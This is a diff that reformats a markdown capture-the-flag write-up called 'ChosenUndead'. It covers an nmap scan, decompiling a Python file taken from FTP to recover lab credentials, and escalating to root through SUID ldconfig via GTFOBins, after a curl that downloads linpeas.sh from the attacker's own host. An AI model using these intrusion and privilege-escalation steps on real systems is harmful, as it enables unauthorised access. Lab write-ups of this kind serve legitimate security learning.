@@ -1,5 +1,8 @@
-ChosenUndead
+# ChosenUndead
 
+
+## Enumeration
+```bash
 └─$ nmap -A -p- -T4 10.10.228.206
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 11:30 BST
 Nmap scan report for 10.10.228.206
@@ -72,9 +75,15 @@ SF:\x20elucidate\x20your\x20fate\.\x20Do\x20you\x20seek\x20such\x20enlight
 SF:enment\?If\x20so,\x20come\x20forward,\x20and\x20tell\x20me\x20who\x20yo
 SF:u\x20areUsername:\x20Password:\x20");
 Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+```
 
+### Get the file in the ftp server 
+
+### It's python compyle so i uncompyle it with online tool
 uncompyle undead
 
+#### File Content
+```python
 # uncompyle6 version 3.5.0
 # Python bytecode 3.5 (3350)
 # Decompiled from: Python 3.7.2 (default, Dec 29 2018, 06:19:36) 
@@ -117,7 +126,8 @@ while True:
             conn.close()
     except:
         continue
-
+```
+```bash
 └─$ python script.py
 b'chosen_undead'
 b'descendant_of_the_furtive_pigmy'
@@ -127,11 +137,20 @@ Password: descendant_of_the_furtive_pigmy
 Very well. Then I am pleased to share. Chosen Undead. Your fate... is to succeed the Great Lord Gwyn. So that you may link the Fire, cast away the Dark, and undo the curse of the Undead. To this end, you must visit Anor Londo, and acquire the Lordvessel.
 
 The path is anor_londo_city_of_gods.php
+```
+### Go to the path which is given in the script
+
+### help website for Chosen Prefix Collision Attack
 
 https://sha-mbles.github.io/
 
+## Privilege Escalation
+
 curl -O http://10.8.37.214:80/linpeas.sh
 
+### linpeas gives me the vulnerability
+```bash
 -rwsr-xr-x 1 root root 978K Apr 21  2021 /sbin/ldconfig
-
+```
+### I use the GTFOBins Website to exploit the vulnerability, i just follow the instruction and i got a shell as root
 gtfobins -> ldconfig
